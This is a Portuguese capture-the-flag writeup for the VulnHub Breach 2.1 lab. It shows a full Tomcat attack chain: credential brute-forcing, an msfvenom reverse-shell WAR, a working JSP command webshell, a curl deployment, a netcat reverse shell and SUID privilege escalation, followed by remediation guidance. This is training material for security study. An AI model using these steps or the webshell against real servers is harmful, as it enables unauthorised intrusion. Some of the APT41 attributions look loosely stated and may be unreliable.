# VulnHub: Breach 2.1 — Dominando o Apache Tomcat, Writeup Completo

Bora rapaziada!! A série Breach está de volta e o Breach 2.1 te entrega uma cadeia de exploração completa do Apache Tomcat na mão. Mano, se você já trabalhou com servidores de aplicação Java em engajamentos reais, esse desafio vai te dar um déjà vu instantâneo. Credenciais fracas no Tomcat Manager, deploy de WAR malicioso, webshell JSP e uma escalação de privilégios via SUID clássica. Esse é exatamente o playbook usado pelo APT41 e pelo Lazarus Group em intrusões reais, véi. Vamos nessa. ( ͡° ͜ʖ ͡°)

Valeu demais ao **mrb3n** pela série Breach. A forma como o 2.1 empilha exploração Tomcat sobre o recon da VM anterior é design de gênio, tá ligado?

---

| Campo | Valor |
|-------|-------|
| **Nível** | Intermediário |
| **VM Alvo** | Breach 2.1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/breach-21,159/ |
| **Técnicas** | Host discovery, Nmap full-port, brute-force Tomcat Manager, deploy de WAR malicioso, webshell JSP, reverse shell, exploração de binário SUID, escalação de privilégios |
| **CVEs** | CVE-2017-12617 (Apache Tomcat PUT RCE), CVE-2019-0232 (CGI Servlet RCE) |

> **Dica do autor:**
> "As credenciais de admin do Breach 1.0 podem ser úteis."

---

## Resumo do Ataque

```
[host-discovery: netdiscover / arp-scan]
    |
    v
[nmap -A -T4 -p- -> Apache Tomcat 8.x na porta 8080]
    |
    v
[/manager/html -> 401 Unauthorized -> brute-force credenciais Tomcat]
    |
    v
[creds padrão: tomcat:tomcat -> acesso ao Manager liberado]
    |
    v
[criar payload WAR: msfvenom -p java/jsp_shell_reverse_tcp]
    |
    v
[deploy do WAR via Tomcat Manager UI]
    |
    v
[trigger JSP shell: curl http://ALVO:8080/shell/shell.jsp]
    |
    v
[reverse shell como tomcat7 / www-data]
    |
    v
[find / -perm -u=s -> binário SUID encontrado]
    |
    v
[explorar SUID -> shell root]
    |
    v
[cat /root/flag.txt]
```

---

## Metodologia

1. Host discovery no segmento local para identificar o IP do alvo
2. Scan Nmap completo com detecção de versão de serviço
3. Enumeração do Apache Tomcat Manager e brute-force de credenciais
4. Criação de payload WAR malicioso com msfvenom
5. Deploy do arquivo WAR via API do Tomcat Manager
6. Ativação do webshell JSP e estabelecimento de reverse shell
7. Enumeração de binários SUID e exploração para escalação de privilégios
8. Captura da flag root

---

## Passo 1: Identificando o Alvo

Recon padrão de lab. Identifique o alvo no segmento local antes de qualquer outra coisa.

```bash
route -n
arp-scan --localnet --ignoredups
# Alternativa:
nmap -sn 192.168.110.0/24
```

Saída esperada:

```
192.168.110.151   08:00:27:XX:XX:XX   (VirtualBox)
```

Configurar TARGET para o resto da sessão:

```bash
export TARGET=192.168.110.151
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: IP Blocks]

---

## Passo 2: Scan Nmap Completo com Detecção de Serviço

Nunca assuma padrões. Sempre escaneie todas as 65535 portas. Essa VM roda o Tomcat em uma porta não padrão ou ao lado de outros serviços que um scan padrão perderia.

```bash
nmap -A -T4 -p- $TARGET -oN nmap_full.txt
# -A: detecção de OS, versão, scripts padrão, traceroute
# -T4: timing agressivo (adequado para lab local)
# -p-: todas as 65535 portas
```

Saída esperada:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 6.6.1p1
8080/tcp open  http     Apache Tomcat/8.x
```

Achado principal: Apache Tomcat 8.x na porta 8080. O aplicativo Manager é nosso alvo.

> **O que é o Apache Tomcat Manager?**
> O Tomcat Manager é uma aplicação web empacotada com o Apache Tomcat que permite administradores implantar, remover e gerenciar arquivos WAR (Web Application Archive) remotamente. Com credenciais válidas, oferece capacidade completa de deploy, incluindo implantação de código arbitrário como arquivo WAR.
> Referência: https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1518 Software Discovery]

---

## Passo 3: Apache Tomcat Manager, Brute-Force de Credenciais

Navegue para `http://$TARGET:8080/manager/html`. Você recebe um prompt 401 Unauthorized. Credenciais padrão do Tomcat são notoriamente comuns no mundo real (tomcat:tomcat, admin:admin, tomcat:s3cr3t, etc.). Hora do brute-force.

> **O que é brute-force de credenciais Tomcat Manager?**
> O Apache Tomcat vem com um `tomcat-users.xml` padrão que, quando não devidamente fortalecido, mantém credenciais padrão ou facilmente adivinháveis. Essas credenciais concedem acesso ao aplicativo Manager que tem capacidade completa de deploy de WAR.
> CWE-1188: Default Credentials
> Referência: https://cwe.mitre.org/data/definitions/1188.html

Use o scanner de login Tomcat do Metasploit:

```bash
msfconsole -q

use auxiliary/scanner/http/tomcat_mgr_login
set rhosts $TARGET
set rport 8080
set stop_on_success true
run
```

Alternativa com Hydra (mais explícito):

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
      -f -s 8080 $TARGET http-get /manager/html
```

Saída esperada:

```
[+] http://192.168.110.151:8080/manager/html [200] tomcat:tomcat
```

Credenciais encontradas: `tomcat:tomcat`. Bingo!! ಠᴗᠠ

> **Nota real:** O APT41 explorou instâncias Tomcat voltadas ao público com credenciais padrão em múltiplas intrusões de 2020 contra setores de saúde e financeiro. Referência: https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-275a

> **MITRE ATT&CK:** [T1110.001 Brute Force: Password Guessing] [T1078.001 Valid Accounts: Default Accounts]

---

## Passo 4: Criando o Payload WAR Malicioso

Um arquivo WAR (Web Application Archive) é basicamente um ZIP contendo uma aplicação web Java. O Tomcat Manager implanta qualquer WAR que você faça upload. Criamos um que contém um payload JSP de reverse shell usando msfvenom.

> **O que é um deploy WAR malicioso?**
> O aplicativo Manager do Apache Tomcat permite que usuários autenticados implantem arquivos WAR, que são arquivos ZIP contendo aplicações web. Um WAR malicioso pode conter código JSP arbitrário que executa comandos do sistema, efetivamente fornecendo RCE ao implantador.
> Mapeia para OWASP A05:2021 Misconfiguration de Segurança e T1505.003 Web Shell.

```bash
# Gerar WAR de reverse shell JSP
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=$SEU_IP \
  LPORT=4444 \
  -f war \
  -o shell.war

# Verificar conteúdo do WAR
jar -tf shell.war
# Deve mostrar: WEB-INF/web.xml e o arquivo JSP
```

Alternativa com abordagem clássica cmd.war:

```bash
# Criar um webshell JSP simples de execução de comandos
mkdir -p /tmp/warshell/WEB-INF
cat > /tmp/warshell/cmd.jsp << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) { out.println(disr); disr = dis.readLine(); }
%>
JSPEOF
cat > /tmp/warshell/WEB-INF/web.xml << 'XMLEOF'
<?xml version="1.0" ?>
<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
  "http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app><servlet></servlet></web-app>
XMLEOF
cd /tmp/warshell && jar -cvf /tmp/cmd.war . && cd -
```

> **MITRE ATT&CK:** [T1505.003 Server Software Component: Web Shell] [T1059.004 Command and Scripting Interpreter: Unix Shell]

---

## Passo 5: Deploy do WAR via Tomcat Manager

Dois métodos: GUI (browser) ou API (curl). O método curl é mais limpo para automação.

**Método 1: GUI do Browser**

Navegue para `http://$TARGET:8080/manager/html` e use a seção "WAR file to deploy" na parte inferior. Browse até seu `shell.war` e clique em Deploy.

**Método 2: API cURL (recomendado)**

```bash
# Deploy do WAR via API do Manager
curl -v -u tomcat:tomcat \
  "http://$TARGET:8080/manager/text/deploy?path=/shell&update=true" \
  --upload-file shell.war

# Confirmar implantação:
curl -u tomcat:tomcat "http://$TARGET:8080/manager/text/list"
# Deve mostrar: /shell:running:0:shell
```

A aplicação agora está implantada e ativa em `/shell`.

> **MITRE ATT&CK:** [T1190 Exploit Public-Facing Application] [T1505.003 Web Shell]

---

## Passo 6: Reverse Shell via Payload JSP

Configure seu listener, depois acione o shell acessando o endpoint JSP implantado.

```bash
# Terminal 1: Iniciar listener
nc -nvlp 4444

# Terminal 2: Acionar o reverse shell
curl "http://$TARGET:8080/shell/shell.jsp"
```

Resultado esperado: seu listener nc recebe uma conexão do alvo.

```bash
# Você agora tem um shell como tomcat7 ou www-data
whoami
# tomcat7

# Upgrade para shell totalmente interativo:
python -c 'import pty; pty.spawn("/bin/bash")'
# Ou:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background nc com Ctrl+Z, depois:
stty raw -echo; fg
export TERM=xterm
```

(☞ﾟヮﾟ)☞ Acesso inicial obtido!! Caramba!!

> **Nota real:** CVE-2017-12617 é o canônico "Tomcat partial PUT RCE" que permite upload de arquivo WAR não autenticado. Está no catálogo CISA KEV. A campanha APT41 de 2020 usou exatamente esta técnica (deploy autenticado WAR via Tomcat Manager) contra múltiplos alvos incluindo sistemas Citrix, Cisco e F5. Referência: https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits

> **MITRE ATT&CK:** [T1190 Exploit Public-Facing Application] [T1059.004 Unix Shell Execution]

---

## Passo 7: Enumeração Pós-Exploração

Antes de pular para privesc, coleta intel sobre o alvo. Verifique versão do OS, usuários, arquivos interessantes e binários SUID.

```bash
# Info do OS
uname -a
cat /etc/os-release

# Quem somos nós e quais grupos?
id
groups

# Quais usuários existem?
cat /etc/passwd | grep -v "nologin\|false"

# Encontrar binários SUID
find / -perm -u=s -type f 2>/dev/null

# Verificar permissões sudo
sudo -l

# Procurar em configs Tomcat
find /etc/tomcat* -type f 2>/dev/null
cat /etc/tomcat7/tomcat-users.xml 2>/dev/null

# Verificar arquivos graváveis por todos e cron
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
```

Observe atentamente a saída de binários SUID. Algo fora do comum vai se destacar.

> **MITRE ATT&CK:** [T1082 System Information Discovery] [T1083 File and Directory Discovery] [T1069 Permission Groups Discovery]

---

## Passo 8: Escalação de Privilégios via Binário SUID

A enumeração de binários SUID revela um binário não padrão com o bit setuid ativado. Isso permite que ele seja executado com os privilégios do dono do arquivo (root) independentemente de quem o execute.

> **O que é exploração SUID?**
> Quando um binário tem o bit setuid ativo (`-rwsr-xr-x`), ele executa com os privilégios do dono. Se o dono é root e o binário pode ser coagido a executar comandos arbitrários, um atacante ganha acesso root. GTFOBins documenta todo binário SUID explorável comum.
> Referência: https://gtfobins.github.io/

```bash
# Encontrar o binário SUID (identificado no Passo 7)
find / -perm -u=s -type f 2>/dev/null
# Procurar entradas não padrão como /usr/bin/find, /usr/bin/vim, etc.

# Exemplo: se /usr/bin/find tem SUID:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Exemplo: se /usr/bin/vim tem SUID:
/usr/bin/vim -c ':!/bin/sh'

# Exemplo: se /usr/bin/nmap tem SUID (versões antigas):
echo "os.execute('/bin/sh')" > /tmp/privesc.nse
nmap --script /tmp/privesc.nse

# Após exploração SUID - verificar root:
id
# uid=0(root) gid=0(root) groups=0(root)
```

ᕕ( ᐛ )ᕗ Shell root conquistado!! Top demais!!

> **Nota real:** Misconfigurações SUID são encontradas consistentemente em auditorias Linux empresariais. Em 2021, a equipe de pesquisa da Qualys descobriu o CVE-2021-4034 (PwnKit), uma vulnerabilidade relacionada a SUID no polkit afetando todas as principais distribuições Linux, presente por 12+ anos. Referência: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Abuse Elevation Control: Setuid and Setgid]

> **Referência GTFOBins:** https://gtfobins.github.io/

---

## Passo 9: Root e Flag Final

**ᕕ( ᐛ )ᕗ Root conquistado!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Capturar a flag
ls /root/
cat /root/flag.txt
# Ou encontrá-la:
find / -name "flag*.txt" 2>/dev/null
```

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Quebrado/Usado |
|------|-------|---------------|----------------|
| Credencial | `tomcat:tomcat` | Brute-force Tomcat Manager | Deploy WAR |
| Flag | Flag root | `/root/flag.txt` | via privesc SUID |
| Config | tomcat-users.xml | `/etc/tomcat7/tomcat-users.xml` | Confirmação credencial |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | Apache Tomcat Manager com credenciais padrão exposto | CVEs listam centenas de implantações Tomcat com creds padrão ainda ativas; Shodan mostra milhares de interfaces Tomcat Manager expostas | Nunca exponha o Tomcat Manager a redes não confiáveis; sempre mude as credenciais padrão |
| 2 | Deploy WAR autenticado equivale a execução de código irrestrita | Esta é a técnica exata usada pelo APT41 e Lazarus Group em campanhas reais | Desabilite o Manager em produção a menos que explicitamente necessário; implemente controles rígidos de acesso por rede |
| 3 | Misconfiguraçao SUID permite escalação local de privilégios | Misconfiguraçao SUID é um achado top-5 em auditorias Linux empresariais | Audite regularmente todos os binários SUID; nunca defina SUID em binários que podem executar código arbitrário |
| 4 | Conta de serviço (tomcat7) sem isolamento de container | Implantações modernas devem rodar Tomcat em containers com flags no-new-privileges | Use hardening systemd ou containerização para servidores de aplicação |

**Por que isso importa fora do lab?**

A exploração do Apache Tomcat está longe de ser teórica. O CVE-2017-12617 (Tomcat partial PUT) está no catálogo de Vulnerabilidades Conhecidas Exploradas da CISA e foi ativamente explorado no mundo real. O APT41, grupo patrocinado pelo estado chinês rastreado pela Mandiant, usou deploy autenticado WAR via Tomcat Manager como vetor principal de acesso inicial em sua campanha global de intrusão de 2020, comprometendo alvos em saúde, serviços financeiros e governo em múltiplos países.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Reconhecimento | TA0043 | Network Service Discovery | T1046 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Acesso Inicial | TA0001 | Valid Accounts: Default Accounts | T1078.001 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistência | TA0003 | Server Software Component: Web Shell | T1505.003 |
| Acesso a Credenciais | TA0006 | Brute Force: Password Guessing | T1110.001 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Descoberta | TA0007 | System Information Discovery | T1082 |
| Descoberta | TA0007 | Permission Groups Discovery | T1069 |
| Escalação de Privilégios | TA0004 | Setuid and Setgid | T1548.001 |
| Evasão de Defesa | TA0005 | Abuse Elevation Control Mechanism | T1548 |
| Coleta | TA0009 | Data from Local System | T1005 |

> ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Alterar todas as credenciais padrão do Tomcat Manager imediatamente; aplicar senhas fortes (20+ caracteres, classes de caracteres mistas)
2. Restringir acesso ao Tomcat Manager por endereço IP em `context.xml` (permitir apenas de `127.0.0.1` ou subnet de admin específica)
3. Desabilitar as aplicações Manager e Host-Manager em produção se deploy remoto de WAR não for necessário
4. Auditar todos os binários SUID; remover SUID de binários não essenciais; nunca definir SUID em interpretadores ou ferramentas com capacidade de execução de shell
5. Aplicar patch do CVE-2017-12617: upgrade do Apache Tomcat para 9.0.1+, 8.5.23+, ou 8.0.47+; desabilitar partial PUT via `readonly=true` no DefaultServlet
6. Executar Tomcat sob conta de serviço dedicada de baixo privilégio com hardening systemd (`NoNewPrivileges=true`, `ProtectSystem=strict`)

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Colocar a interface Tomcat Manager offline imediatamente ou restringir ao localhost
- Rotacionar todas as credenciais de usuário Tomcat de `tomcat-users.xml`
- Revisar logs de acesso Tomcat por evidências de deploys WAR não autorizados
- Pesquisar no diretório de aplicações implantadas (`webapps/`) por WARs inesperados ou recentemente modificados
- Auditar `/etc/sudoers`, binários SUID e arquivos graváveis por todos por persistência

**Contramedidas MITRE D3FEND:**
- D3-MFA (Multi-Factor Authentication) para proteger acesso admin ao Tomcat Manager T1110
- D3-IVA (Input Validation) e controles em nível de aplicação para upload WAR T1190
- D3-OPS (OS Process Sandboxing) para restringir exploração SUID T1548.001
- D3-SJA (Scheduled Job Analysis) para detectar persistência baseada em cron T1053

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID): Inventariar todos os servidores de aplicação e suas interfaces de gerenciamento (ID.AM-2)
- Proteger (PR): Remover credenciais padrão; restringir acesso à interface de gerenciamento; aplicar patches (PR.AC-4, PR.IP-12)
- Detectar (DE): Monitorar logs de acesso Tomcat por deploys via Manager; alertar sobre novos deploys WAR (DE.CM-4, DE.CM-7)
- Responder (RS): Isolar servidor de aplicação comprometido; rotacionar credenciais; auditar aplicações implantadas (RS.MI-1)
- Recuperar (RC): Reimplantar a partir de artefatos WAR de boa procedência conhecida; verificar ausência de backdoors (RC.RP-1)

**NIST SP 800-53 (Rev. 5):**
- IA-5: Gerenciamento de Autenticadores (eliminação de credenciais padrão, complexidade de senha)
- CM-7: Menor Funcionalidade (desabilitar Tomcat Manager em produção se não necessário)
- CM-6: Configurações (fortalecer configuração Tomcat; restringir partial PUT)
- AC-3: Controle de Acesso (restrição por IP na interface Manager)
- SI-2: Remediação de Falhas (patch CVE-2017-12617 e CVEs Tomcat relacionados)
- AC-6: Menor Privilégio (auditoria SUID; executar Tomcat como conta de serviço não-root)

**CISA Known Exploited Vulnerabilities:**
- CVE-2017-12617: Apache Tomcat Remote Code Execution via partial PUT request
  Status: Listado no catálogo CISA KEV
  Patch: Tomcat 9.0.1+, 8.5.23+, 8.0.47+
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ASSET
- Prática: Asset Management; manter inventário de todos os servidores de aplicação e suas interfaces de gerenciamento expostas
- MIL Alvo: MIL-2
- Domínio: TECHNOLOGY
- Prática: Configuration Management; aplicar baselines de hardening para servidores de aplicação (CIS Apache Tomcat Benchmark)
- MIL Alvo: MIL-2
- Domínio: THREAT
- Prática: Threat Intelligence; rastrear exploração do CVE-2017-12617 e CVEs relacionados ao Tomcat
- MIL Alvo: MIL-2

---

## Considerações Finais

Valeu ao **mrb3n** pela série Breach. O Breach 2.1 é uma VM intermediária fantástica que ensina a cadeia completa de exploração do Apache Tomcat em um ambiente de lab controlado. O que a torna particularmente valiosa é que isso não é teórico: o APT41 usou essa técnica exata (deploy autenticado WAR via Tomcat Manager) em sua campanha global de 2020. Saber explorar significa saber defender.

Além do lab, as lições aqui se aplicam a qualquer servidor de aplicação Java com interface de gerenciamento: JBoss, WebLogic, WebSphere. O padrão é idêntico: credenciais fracas ou padrão, exposição de API de gerenciamento, deploy de código arbitrário. Ambientes empresariais ainda implantam esses servidores em escala com hardening mínimo.

Se esse writeup te ajudou a cravar o desafio, compartilha com a galera e continua hackeando, mano!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português por André Henrique: https://medium.com/@mrhenrike (quando publicado)

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
